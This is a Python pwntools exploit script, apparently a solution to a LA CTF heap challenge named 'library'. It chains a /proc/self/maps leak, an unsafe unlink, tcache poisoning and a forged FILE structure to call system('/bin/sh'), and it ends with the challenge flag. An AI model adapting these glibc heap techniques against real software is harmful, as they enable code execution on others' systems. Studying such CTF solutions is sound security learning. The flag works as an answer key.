from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', './library'], gdbscript='''
    # b *(main+306)
    # b *(main+318)
    # b *(main+330)
    # b *(main+342)
    continue
''')

# p = remote('chall.lac.tf', 31174)

def order_book(name):
    p.sendlineafter(b'choice: ', b'1')
    id = p.recvline().decode().split()[-1]
    p.sendafter(b'enter name: ', name)
    return id

def read_book(id):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'enter id: ', str(id).encode())
    p.recvuntil(b'watch out, book incoming!\n')
    data = p.recvuntil(b'hope you enjoyed the read :D\n', drop=True)
    return data

def review_book_add(id, length, review):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'enter id: ', str(id).encode())
    p.sendlineafter(b'enter review length: ', str(length).encode())
    p.sendafter(b'enter review: ', review)

def review_book_delete(id):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'enter id: ', str(id).encode())
    p.sendlineafter(b'would you like to delete the current review? [Y/n] ', b'y')

def manage_account_update_bio(bio):
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'would you like to update your bio? [Y/n] ', b'y')
    p.sendlineafter(b'enter bio: ', bio)
    p.sendlineafter(b'would you like to add your library card? [Y/n] ', b'n')
    p.sendafter(b'would you like to recover settings through RAIS? [Y/n]', b'n')

def manage_account_add_card(length, card):
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'would you like to update your bio? [Y/n] ', b'n')
    p.sendlineafter(b'would you like to add your library card? [Y/n] ', b'y')
    p.sendlineafter(b'enter card length: ', str(length).encode())
    p.sendafter(b'enter card: ', card)
    p.sendlineafter(b'would you like to recover settings through RAIS? [Y/n]', b'n')

def manage_account_recover_settings():
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'would you like to update your bio? [Y/n] ', b'n')
    p.sendlineafter(b'would you like to add your library card? [Y/n] ', b'n')
    p.sendlineafter(b'would you like to recover settings through RAIS? [Y/n]', b'y')

glibc_e = ELF('./libc.so.6')

# Stage 1: Leak elf base address
leak_file = order_book(b'/proc/self/maps')
manage_account_add_card(0x18, p64(0)+p64(0x1a1))    # add a fake chunk size 0x1a1 (prev inuse) to pass the read check and prepare for unsafe unlink
elf_base_addr = int(read_book(leak_file)[0:12].decode(), 16)
log.info('elf base addr: ' + hex(elf_base_addr))

# Stage 2: Leak libc base address (unsafe unlink)
manage_account_update_bio(p64(elf_base_addr+0x4260-0x18)+p64(elf_base_addr+0x4260-0x10))    # add fd/bk pointers to prepare for unsafe unlink
a = order_book(b'/a')
b = order_book(b'/b')
c = order_book(b'/c')
d = order_book(b'/d')
review_book_add(a, 0x38, b'A')
review_book_add(b, 0x4f8, b'B')
review_book_add(c, 0x28, b'C')
review_book_delete(a)
review_book_add(a, 0x38, b'A'*0x30+p64(0x1a0))    # add a fake previous chunk size 0x1a0 to prepare for unsafe unlink
review_book_delete(b)   # chunk of size 0x1a0+0x500 will be freed to the unsorted bin
review_book_add(d, 0x198, b'D'*0x18+p16(0xffff))    # add a chunk of size 0x1a0 to overwrite the read size
manage_account_recover_settings()
leak_addrs = read_book(leak_file)
heap_base_addr = int(leak_addrs.split(b"\n")[5].split(b"-")[0], 16)
log.info('heap base addr: ' + hex(heap_base_addr))
glibc_base_addr = int(leak_addrs.split(b"\n")[7].split(b"-")[0], 16)
log.info('libc base addr: ' + hex(glibc_base_addr))

# Stage 3: Pop a shell using FSOP (house of einherjar with tcache poisoning)
e = order_book(b'/e')
review_book_add(e, 0x448, b'E') # clear the unsorted bin
f = order_book(b'/f')
g = order_book(b'/g')
h = order_book(b'/h')
i = order_book(b'/i')
j = order_book(b'/j')
k = order_book(b'/k')
l = order_book(b'/l')
review_book_add(f, 0x28, b'F'*8+p64(0x281)+p64(heap_base_addr+0xad0)+p64(heap_base_addr+0xad0)) # add a fake chunk size 0x281 (prev inuse) and fd/bk pointers to prepare for unsafe unlink
review_book_add(g, 0x100, b'G')
review_book_add(h, 0x100, b'H')
review_book_add(i, 0x38, b'I')
review_book_add(j, 0x4f8, b'J')
review_book_add(k, 0x28, b'K')
review_book_delete(i)
review_book_add(i, 0x38, b'I'*0x30+p64(0x280))    # add a fake previous chunk size 0x280 to prepare for unsafe unlink
review_book_delete(h)
review_book_delete(g)
review_book_delete(j)   # chunk of size 0x280+0x500 will be freed to the unsorted bin
review_book_add(l, 0x38, b'L'*0x18+p64(0x111)+p64(((heap_base_addr+0xb00)>>12)^(glibc_base_addr+glibc_e.sym._IO_2_1_stdout_))) # tcache poisoning
m = order_book(b'/m')
n = order_book(b'/n')
review_book_add(m, 0x100, b'M')
stdout_lock = glibc_e.sym['_IO_stdfile_1_lock']+glibc_base_addr
stdout = glibc_e.sym['_IO_2_1_stdout_']+glibc_base_addr
fake_vtable = glibc_e.sym['_IO_wfile_jumps']-0x18+glibc_base_addr
gadget = next(glibc_e.search(asm('add rdi, 0x10 ; jmp rcx')))+glibc_base_addr
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=glibc_e.sym['system']+glibc_base_addr
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout_lock
fake._codecvt= stdout+0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
review_book_add(n, 0x100, bytes(fake))

p.interactive()

# lactf{procfs_my_beloved_and_sendfile_my_behated}
